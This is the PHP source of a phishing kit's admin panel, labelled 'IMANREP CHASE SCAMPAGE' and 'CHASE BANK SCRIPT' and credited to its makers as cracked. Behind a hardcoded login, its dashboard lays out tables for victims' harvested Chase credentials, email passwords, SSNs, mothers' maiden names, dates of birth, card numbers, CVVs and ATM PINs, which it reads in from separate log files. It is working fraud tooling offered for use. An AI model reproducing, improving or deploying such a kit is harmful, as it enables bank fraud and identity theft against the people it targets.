<?php 
 
/*   
    ⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀
⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀
⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿⠀
⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀
⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀IMANHALAL⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀
⠀⣿⣿⠀⠀⠀⣿⣿⡇CHASE BANK SCRIPT⢸⣿⣿⠀⠀
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀
⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⢠⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
*/
///DON'T TOUCH THIS\\\
session_start();
error_reporting(0);

if (isset($_POST['submit'])) {
            $user = array(
                        "user" => "imanhalal",
                        "pass"=>"fuck2020"  );  
    if ($_POST['username'] == $user['user'] && $_POST['password'] == $user['pass']){
            
            
//Session
$cookie = "user";
if(isset($_POST['user'])){	
	if(!empty($_POST['user'])){
	if ($_POST['adminpass'] == user) {
	setcookie($cookie, user, time() + (86400 * 30), "../admin");
	header ("Location: ./");
	}
	}
}

if ($_COOKIE[$cookie] == $yourpass) {
	echo '<!doctype html><html lang="en"><head> <title>ADMIN PANEL</title> <link rel="icon" href="../img/iconad.png" type="image/png"> <meta charset="utf-8"> <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" /> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" /> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,XMRbootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css"> <link href="../css/dashboard.css?v=2.1.0" rel="stylesheet" /></head><body class="dark-edition"> <div class="wrapper "> <div class="sidebar" data-color="orange" data-background-color="black" > <div class="logo"> 
    <style>.overlay { opacity: 0;}#bb:hover .overlay { opacity: 1;}</style><form action="imageprofile.php?x" method="POST" enctype="multipart/form-data" > <div id="bb" ><center><label for="image" >';
  if (file_exists("./my.png")){
    echo '<img src="my.png" alt="avatar" style="border-radius: 100%;width: 100px;background-color: #1f283d;color: #f08905;border-style: dotted;">';
}
elseif (file_exists("./my.jpeg")){
	echo '<img src="my.jpeg" alt="avatar" style="border-radius: 100%;width: 100px;background-color: #1f283d;color: #f08905;border-style: dotted;">';
}
elseif (file_exists("./my.jpg")){
	echo '<img src="my.jpg" alt="avatar" style="border-radius: 100%;width: 100px;background-color: #1f283d;color: #f08905;border-style: dotted;">';
}
else{
    echo '<img src="../img/avatar.png" alt="avatar" style="border-radius: 100%;width: 100px;background-color: #1f283d;color: #f08905;border-style: dotted;">';
}
	echo '</center></div></form> <a target="_blank" href="//fb.com/XBALTI" class="simple-text logo-normal"> IMANREP </a> </div> <div class="sidebar-wrapper"> <ul class="nav"> <li class="nav-item dash active "> <a id="fuckdash" class="nav-link" href="#"> <i class="material-icons">dashboard</i> <p>Dashboard</p> </a> </li> <li class="nav-item logs "> <a id="fucklogs" style="" class="nav-link" href="#"> <i class="material-icons">supervised_user_circle</i> <p>LOGS<span id="locount" class="bg-dark rounded-circle px-2 py-1 mx-2 h4">0</span></p> </a> </li> <li class="nav-item emails "> <a id="fuckemails" style="" class="nav-link" href="#"> <i class="material-icons">email</i> <p>Email Access<span id="emcount" class="bg-dark rounded-circle px-2 py-1 mx-2 h4">0</span></p> </a> </li> <li class="nav-item ssn "> <a id="fuckssn" style="" class="nav-link" href="#"> <i class="material-icons">security</i> <p>SSN & DOB<span id="sncount" class="bg-dark rounded-circle px-2 py-1 mx-2 h4">0</span></p> </a> </li> <li class="nav-item cards "> <a id="fuckcards" style="" class="nav-link" href="#"> <i class="material-icons">credit_card</i> <p>Cards<span id="cacount" class="bg-dark rounded-circle px-2 py-1 mx-2 h4">0</span></p> </a> </li> <li class="nav-item emailstwo "> <a id="fuckemailstwo" style="" class="nav-link" href="#"> <i class="material-icons">email</i> <p>Email Access Two<span id="emtcount" class="bg-dark rounded-circle px-2 py-1 mx-2 h4">0</span></p> </a> </li> <li class="nav-item cardstwo "> <a id="fuckcardstwo" style="" class="nav-link" href="#"> <i class="material-icons">credit_card</i>  <p>Cards Two<span id="catcount" class="bg-dark rounded-circle px-2 py-1 mx-2 h4">0</span></p> </a> <li class="nav-item cardstwo"> <a id="fuckcardstwo" style="" class="nav-link" href="logout.php"> <i class="material-icons">lock_open</i>  <p>Logout<span id="catcount" ></span></p> </a> </li> </li> </ul> </div> </div> <div class="main-panel"><nav class="navbar navbar-expand-lg navbar-transparent navbar-absolute fixed-top "> <div class="container-fluid"> <div class="navbar-wrapper"> <a class="navbar-brand" href="">Refresh Page</a> </div> </div> </nav> <div class="content" > <div class="container-fluid"> <div class="row" id="9lawidzeb"> <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6"> <div class="card card-stats"> <div class="card-header card-header-warning card-header-icon"> <div class="card-icon"> <i class="material-icons">location_on</i> </div> <h4 class="card-title">Visitors</h4> <h3 class="card-title" id="vusv">0</h3> </div> <div class="card-footer"> <div class="stats"> <i class="material-icons text-warning">link</i> <a href="#" class="warning-link" id="govu">CHECK</a> </div> </div> </div> </div> <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6"> <div class="card card-stats"> <div class="card-header card-header-success card-header-icon"> <div class="card-icon"> <i class="material-icons">email</i> </div> <h4 class="card-title">Emails</h4> <h3 class="card-title" id="emailsv">0</h3> </div> <div class="card-footer"> <div class="stats"> <i class="material-icons text-success">link</i><a href="#" class="success-link" id="goemail" >CHECK</a> </div> </div> </div> </div> <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6"> <div class="card card-stats"> <div class="card-header card-header-danger card-header-icon"> <div class="card-icon"> <i class="material-icons">security</i> </div> <h4 class="card-title">SSN & DOB</h4> <h3 class="card-title" id="ssnv" >0</h3> </div> <div class="card-footer"> <div class="stats"> <i class="material-icons text-danger">link</i><a href="#" class="danger-link" id="gossn" >CHECK</a> </div> </div> </div> </div> <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6"> <div class="card card-stats"> <div class="card-header card-header-info card-header-icon"> <div class="card-icon"> <i class="material-icons">credit_card</i> </div> <h4 class="card-title">Cards</h4> <h3 class="card-title" id="cardsv" >0</h3> </div> <div class="card-footer"> <div class="stats"> <i class="material-icons text-info">link</i><a href="#" class="info-link" id="gocard">CHECK</a> </div> </div> </div> </div><div class="col-xl-3 col-lg-6 col-md-6 col-sm-6"> <div class="card card-stats"> <div class="card-header card-header-success card-header-icon"> <div class="card-icon"> <i class="material-icons">email</i> </div> <h4 class="card-title">Emails Two</h4> <h3 class="card-title" id="emailstwov" >0</h3> </div> <div class="card-footer"> <div class="stats"> <i class="material-icons text-success">link</i><a href="#" class="success-link" id="goemailtwo" >CHECK</a> </div> </div> </div> </div><div class="col-xl-3 col-lg-6 col-md-6 col-sm-6"> <div class="card card-stats"> <div class="card-header card-header-info card-header-icon"> <div class="card-icon"> <i class="material-icons">credit_card</i> </div> <h4 class="card-title">Logout</h4> <h3 class="card-title" id="cardstwov">0</h3> </div> <div class="card-footer"> <div class="stats"> <i class="material-icons text-info">link</i><a href="#" class="info-link" id="gocardtwo" >CHECK</a> </div> </div> </div> </div> </div> <div class="col-md-12" id="vustable"> <div class="card card-plain"> <div class="card-header card-header-warning"> <h4 class="card-title mt-0"><strong id="vuscount" >0</strong> person viewed your page</h4> <p class="card-category">Visitors Information</p> </div> <div class="card-body"> <div class="table-responsive"> <table class="table table-hover"> <thead class=""> <th> IP </th> <th> Time/Dtae </th> <th> Device/Browser </th> <th> Country </th> <th> Network </th> </thead> <tbody>';
	include '../rz/vusimanhalal.html';
	echo '</tbody> </table> </div> </div> </div> </div> <div class="col-md-12" id="logstable" style="display:none;"> <div class="card card-plain"> <div style="background: linear-gradient(60deg, rgb(123, 31, 162), rgb(145, 63, 158)); box-shadow: rgba(0, 0, 0, 0.14) 0px 4px 20px 0px, rgba(156, 39, 176, 0.4) 0px 7px 10px -5px;" class="card-header card-header-success"> <h4 class="card-title mt-0"><strong id="logscount" >0</strong> Login</h4> <p class="card-category">LOGS INFORMATION</p> </div> <div class="card-body"> <div class="table-responsive"> <table class="table table-hover"> <thead class=""> <th> USERNAME </th> <th> PASSWORD </th> <th> BROWSER/DEVICE </th> <th> IP/INFO </th><th> TIME/DATE </th> </thead> <tbody>';
	include '../rz/logsimanhalal.html';
	echo '</tbody> </table> </div> </div> </div> </div> <div id="emailstable" class="col-md-12" style="display:none;"> <div class="card card-plain"> <div class="card-header card-header-success"> <h4 class="card-title mt-0"><strong id="emailscount" >0</strong> Email Access</h4> <p class="card-category">EMAILS INFORMATION</p> </div> <div class="card-body"> <div class="table-responsive"> <table class="table table-hover"> <thead class=""> <th> USERNAME </th> <th> PASSWORD </th><th> EMAIL </th> <th> PASSWORD </th> <th> BROWSER/DEVICE </th> <th> IP/INFO </th><th> TIME/DATE </th> </thead> <tbody>';
	include '../rz/emailsimanhalal.html';
	echo ' </tbody> </table> </div> </div> </div> </div> <div id="emailstwotable" class="col-md-12" style="display:none;"> <div class="card card-plain"> <div class="card-header card-header-success"> <h4 class="card-title mt-0"><strong id="emailstwocount" >0</strong> Email Access Two</h4> <p class="card-category">EMAILS TWO INFORMATION</p> </div> <div class="card-body"> <div class="table-responsive"> <table class="table table-hover"> <thead class=""> <th> USERNAME </th> <th> PASSWORD </th><th> EMAIL </th> <th> PASSWORD </th><th> EMAIL/TWO </th><th> PASSWORD/TWO </th> <th> BROWSER/DEVICE </th> <th> IP/INFO </th><th> TIME/DATE </th> </thead> <tbody>';
	include '../rz/emailstwoimanhalal.html';
	echo '</tbody> </table> </div> </div> </div> </div><div id="ssntable" class="col-md-12" style="display:none;"> <div class="card card-plain"> <div class="card-header card-header-danger"> <h4 class="card-title mt-0"><strong id="ssncount" >0</strong> SSN/MMN/DOB</h4> <p class="card-category">SSN & MMN & DOB INFORMATION</p> </div> <div class="card-body"> <div class="table-responsive"> <table class="table table-hover"> <thead class=""> <th> USERNAME </th> <th> PASSWORD </th><th> EMAIL </th> <th> PASSWORD </th><th> EMAIL/TWO </th><th> PASSWORD/TWO </th><th> SSN </th><th> MMN </th><th> DOB </th> <th> BROWSER/DEVICE </th> <th> IP/INFO </th><th> TIME/DATE </th> </thead> <tbody>';
	include '../rz/ssnimanhalal.html';
	echo ' </tbody> </table> </div> </div> </div> </div><div id="cardtable" class="col-md-12" style="display:none;"> <div class="card card-plain"> <div class="card-header card-header-info"> <h4 class="card-title mt-0"><strong id="cardcount" >0</strong> CARD</h4> <p class="card-category">CARD INFORMATION</p> </div> <div class="card-body"> <div class="table-responsive"> <table class="table table-hover"> <thead class=""> <th> USERNAME </th> <th> PASSWORD </th><th> EMAIL </th> <th> PASSWORD </th><th> EMAIL/TWO </th><th> PASSWORD/TWO </th><th> SSN </th><th> MMN </th><th> DOB </th><th> CARD/NUMBER </th><th> CVV </th><th> EX/DATE </th><th> ATM/PIN </th> <th> BROWSER/DEVICE </th> <th> IP/INFO </th><th> TIME/DATE </th> </thead> <tbody>';
	include '../rz/cardsimanhalal.html';
	echo '</tbody> </table> </div> </div> </div> </div><div id="cardtwotable" class="col-md-12" style="display:none;"> <div class="card card-plain"> <div class="card-header card-header-info"> <h4 class="card-title mt-0"><strong id="cardtwocount" >0</strong> CARD TWO</h4> <p class="card-category">CARD TWO INFORMATION</p> </div> <div class="card-body"> <div class="table-responsive"> <table class="table table-hover"> <thead class=""> <th> USERNAME </th> <th> PASSWORD </th><th> EMAIL </th> <th> PASSWORD </th><th> EMAIL/TWO </th><th> PASSWORD/TWO </th><th> SSN </th><th> MMN </th><th> DOB </th><th> CARD/NUMBER </th><th> CVV </th><th> EX/DATE </th><th> ATM/PIN </th><th> CARD/NUMBER/TWO </th><th> CVV/TWO </th><th> EX/DATE/TWO </th><th> ATM/PIN/TWO </th> <th> BROWSER/DEVICE </th> <th> IP/INFO </th><th> TIME/DATE </th> </thead> <tbody>';
	include '../rz/cardstwoimanhalal.html';
	echo '</tbody> </table> </div> </div> </div> </div> </div> </div> <footer class="footer"> <div class="container-fluid"> <nav class="float-right"> <div class="copyright float-right"> &copy; <script> document.write(new Date().getFullYear()) </script>, made with <i class="material-icons">favorite</i> by <a href="//fb.com/XBALTI" target="_blank">XBALTI</a> Cracked by <a href="//fb.com/tammie.maleek" target="_blank">Iman Halal</a></div> </nav> </div> </footer> </div> </div> <script src="../js/jquery.min.js" ></script> <script src="../js/MyBaby.js" ></script></body></html>';
}
 } else {
        // Tampilkan Pesan Error
        display_login_form();
       
    }
}    
else { 
    display_login_form();
}
function display_login_form(){ ?>
    
    
   <html lang="en">
<head>
	<title>IMANREP CHASE SCAMPAGE</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="../img/irep.png"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->

     
                  
       
</head>
<body>
<form action="" method="POST">
	<div class="limiter">
		<div class="container-login100" style="background-image: url('images/bg-01.jpg');">
			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-54">
				<form class="login100-form validate-form">
                <span class="login100-form-title p-b-49">
						IMANREP  <br><p>CHASE BANK PANEL</p>
					</span>


            <div class="wrap-input100 validate-input m-b-23">
                <label for="username">Username</label>
                <input class="input100" type="text" name="username" placeholder="Username or email" />
                <span class="focus-input100" data-symbol="&#xf206;"></span>
            </div>


            <div class="wrap-input100 validate-input">
                <label for="password">Password</label>
                <input class="input100" type="password" name="password" placeholder="Password" />
                <span class="focus-input100" data-symbol="&#xf190;"></span>
            </div>
            <div class="text-right p-t-8 p-b-31">
						<a href="https://t.me/ImanHalal">
							Contact me
						</a>
					</div>
                    
                    <div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
            <input type="submit" class="btn btn-success btn-block" name="submit" value="LOGIN" />
            </div>
<div class="flex-col-c p-t-155">
						<p class="loginhere">
                        SCAMPAGE CRACKED BY <a href="../daftar" class="loginhere-link">IMAN HALAL</a>
        </form>
            
        </div>

        <div class="col-md-6">
            <!-- isi dengan sesuatu di sini -->
            
        </div>

    </div>
</div>
    
<!--===============================================================================================-->
<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>


</body>
</html>
    
    
<? } 
?>



<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">